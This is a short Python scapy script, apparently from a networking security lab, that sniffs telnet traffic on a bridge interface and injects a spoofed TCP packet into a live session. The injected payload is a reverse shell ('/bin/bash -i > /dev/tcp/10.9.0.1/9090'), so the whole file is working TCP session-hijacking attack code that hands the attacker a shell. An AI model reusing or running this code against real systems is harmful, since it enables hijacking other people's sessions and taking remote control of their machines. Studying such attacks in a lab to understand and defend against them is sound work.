#!/usr/bin/env python3
from scapy.all import *

def send_cmd(pkt):
    if not pkt[IP][TCP].payload:
        newpkt = IP() / TCP() / Raw(load = '\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1\r')
        newpkt[IP].src = pkt[IP].src
        newpkt[IP].dst = pkt[IP].dst
        newpkt[TCP].sport = pkt[TCP].sport
        newpkt[TCP].dport = pkt[TCP].dport        
        newpkt[TCP].flags = 'PA'
        newpkt[TCP].seq = pkt[TCP].seq
        newpkt[TCP].ack = pkt[TCP].ack
        send(newpkt, verbose=0)
        print('injected reverse shell...')
    
sniff(iface = 'br-fee11e059dc7', filter = 'tcp dst port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = send_cmd)
